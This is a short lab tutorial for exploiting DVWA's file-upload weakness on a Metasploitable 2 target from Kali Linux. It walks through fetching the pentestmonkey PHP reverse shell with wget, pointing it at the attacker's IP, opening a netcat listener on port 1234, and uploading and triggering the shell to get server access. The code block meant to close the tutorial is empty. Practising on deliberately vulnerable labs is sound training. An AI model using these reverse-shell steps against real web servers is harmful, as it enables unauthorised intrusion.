
---
- Open your Metasploitable 2, and check its inet using the code *ifconfig*.
- Open your Kali Linux and open that IP address on your browser to open the metasploitable server where you will open DVWA known as Damn Vulnerable Web App, log into it with the username and password given.
- Before anything else open its security settings and turn the security level to low if its high or medium on default.
- Now at first we will try to upload a normal photo so download one from the internet and upload it, if it works go ahead.
- Now we will be downloading a reverse shell php so search on the browser, "reverse shell php pentestmonkey"
- Open that file and copy the raw, now open the cmd  and write **wget the copied link**.
```
cd Desktop
mkdir Webapp
cd Webapp
wget <the copied link>
mousepad <name of the reversephpfile>
```
- Now change the IP to the IP of the kali system, also you can change its port if you want to change.
```
netcat -lvnp 1234 (the port number you have in the reversephp file)
```
- Once you get the output such as "listening" then open the DVWA and upload the php file into it. 
- Now you need to open the uploaded path and open the php inside the DVWA.
- The path will look something like this : /../dvwa/vulnerabilities/upload
- This is not the exact one but you will get the gist.
- And now you are in the server and you can explore

#### Some Additional information
If you want the shell of the exploited server to run and look a little user friendly then give this command
```

```